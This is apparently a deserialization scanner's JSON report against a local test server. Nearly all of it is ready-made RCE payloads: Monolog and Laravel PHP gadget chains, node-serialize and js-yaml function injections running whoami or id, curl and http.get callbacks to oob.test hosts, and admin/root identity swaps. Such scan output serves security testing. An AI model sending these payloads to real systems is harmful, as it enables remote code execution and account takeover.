+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NjoidW5saW5rIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czo2OiJ3aG9hbWkiO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6Njoid2hvYW1pIjt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InVubGluayI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovLzQxNmIyNWIwMWU1MS5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo2OiJzeXN0ZW0iO319fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovLzQxNmIyNWIwMWU1MS5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo0OiJleGVjIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovLzQxNmIyNWIwMWU1MS5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo4OiJwYXNzdGhydSI7fX19",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjM0OiJjdXJsIGh0dHA6Ly80MTZiMjViMDFlNTEub29iLnRlc3QvIjt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czozNDoiY3VybCBodHRwOi8vNDE2YjI1YjAxZTUxLm9vYi50ZXN0LyI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6MzQ6ImN1cmwgaHR0cDovLzQxNmIyNWIwMWU1MS5vb2IudGVzdC8iO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8088/api/import-async",
+      "method": "POST",
+      "location": "raw_body",
+      "name": "payload",
+      "occurrences": 1,
+      "oob_token": "0bb512b0e382",
+      "type": "NodeJS",
+      "subtype": "node-serialize RCE",
+      "confidence": "High",
+      "exploit_type": "node-serialize RCE",
+      "suggested_probe": "node_serialize",
+      "severity": "Critical",
+      "severity_note": null,
+      "evidence": "static-only",
+      "notes": "node-serialize RCE pattern detected | Inject: {\"x\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}",
+      "normalized": [
+        "_$$ND_FUNC$$_function () { return 1; }"
+      ],
+      "mutations_count": 4,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "node_serialize_rce",
+          "chain": "node-serialize IIFE",
+          "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('id');}()",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "node_serialize_rce",
+          "chain": "node-serialize IIFE",
+          "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('whoami');}()",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "node_serialize_rce",
+          "chain": "node-serialize IIFE",
+          "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('hostname');}()",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "node_serialize_oob",
+          "chain": "node-serialize IIFE: http.get",
+          "payload": "_$$ND_FUNC$$_function(){require('http').get('http://0bb512b0e382.oob.test/');}()",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8088/api/import-yaml",
+      "method": "POST",
+      "location": "cookie",
+      "name": "ref_tag",
+      "occurrences": 1,
+      "oob_token": "a64c41a22a86",
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Identity Spoofing",
+      "suggested_probe": "modify_string",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "static-only",
+      "notes": "Identity fields found: ['name'] | Try changing username/email to another user | Native PHP serialized object (unserialize() on untrusted input, CWE-502) — RCE-capable if the app has a POP gadget chain (phpggc) or a class with a dangerous __wakeup/__destruct; examine source for injectable classes",
+      "normalized": [
+        "O:3:\"Tag\":1:{s:4:\"name\";s:7:\"organic\";}"
+      ],
+      "mutations_count": 18,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czoxMzoiYWRtaW5pc3RyYXRvciI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo0OiJyb290Ijt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo5OiJzdXBlcnVzZXIiO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NDoiZXhlYyI7fX19",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6ODoicGFzc3RocnUiO319fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NjoidW5saW5rIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czo2OiJ3aG9hbWkiO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6Njoid2hvYW1pIjt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InVubGluayI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovL2E2NGM0MWEyMmE4Ni5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo2OiJzeXN0ZW0iO319fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovL2E2NGM0MWEyMmE4Ni5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo0OiJleGVjIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovL2E2NGM0MWEyMmE4Ni5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo4OiJwYXNzdGhydSI7fX19",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjM0OiJjdXJsIGh0dHA6Ly9hNjRjNDFhMjJhODYub29iLnRlc3QvIjt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czozNDoiY3VybCBodHRwOi8vYTY0YzQxYTIyYTg2Lm9vYi50ZXN0LyI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6MzQ6ImN1cmwgaHR0cDovL2E2NGM0MWEyMmE4Ni5vb2IudGVzdC8iO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8088/api/import-yaml",
+      "method": "POST",
+      "location": "raw_body",
+      "name": "payload",
+      "occurrences": 1,
+      "oob_token": "5f7a0e81fe84",
+      "type": "YAML",
+      "subtype": "YAML JS Function RCE (js-yaml)",
+      "confidence": "High",
+      "exploit_type": "YAML JS Function RCE (js-yaml)",
+      "suggested_probe": "yaml_exec",
+      "severity": "Critical",
+      "severity_note": null,
+      "evidence": "static-only",
+      "notes": "Matched: YAML JS Function RCE (js-yaml) (pattern: !!js/(?:function|undefined|regexp)|!<tag:yaml\\.org,2002:js/) | Vulnerable only with an unsafe loader (yaml.load / YAML.unsafe_load / Psych object mode), not a safe_load",
+      "normalized": [
+        "name: default\nonLoad: !<tag:yaml.org,2002:js/function> 'function () { return true; }'\nenabled: true"
+      ],
+      "mutations_count": 4,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "yaml_js_function",
+          "chain": "js-yaml !!js/function",
+          "payload": "hook: !<tag:yaml.org,2002:js/function> \"function(){ return global.process.mainModule.require('child_process').execSync('id').toString() }\"",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "yaml_js_function",
+          "chain": "js-yaml !!js/function",
+          "payload": "hook: !<tag:yaml.org,2002:js/function> \"function(){ return global.process.mainModule.require('child_process').execSync('whoami').toString() }\"",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "yaml_js_function",
+          "chain": "js-yaml !!js/function",
+          "payload": "hook: !<tag:yaml.org,2002:js/function> \"function(){ return global.process.mainModule.require('child_process').execSync('hostname').toString() }\"",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "yaml_js_function_oob",
+          "chain": "js-yaml !!js/function: http.get",
+          "payload": "hook: !<tag:yaml.org,2002:js/function> \"function(){ return global.process.mainModule.require('http').get('http://5f7a0e81fe84.oob.test/'); }\"",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8088/api/profile",
+      "method": "GET",
+      "location": "cookie",
+      "name": "ref_tag",
+      "occurrences": 1,
+      "oob_token": "ab8dd6a673f9",
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Identity Spoofing",
+      "suggested_probe": "modify_string",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "static-only",
+      "notes": "Identity fields found: ['name'] | Try changing username/email to another user | Native PHP serialized object (unserialize() on untrusted input, CWE-502) — RCE-capable if the app has a POP gadget chain (phpggc) or a class with a dangerous __wakeup/__destruct; examine source for injectable classes",
+      "normalized": [
+        "O:3:\"Tag\":1:{s:4:\"name\";s:7:\"organic\";}"
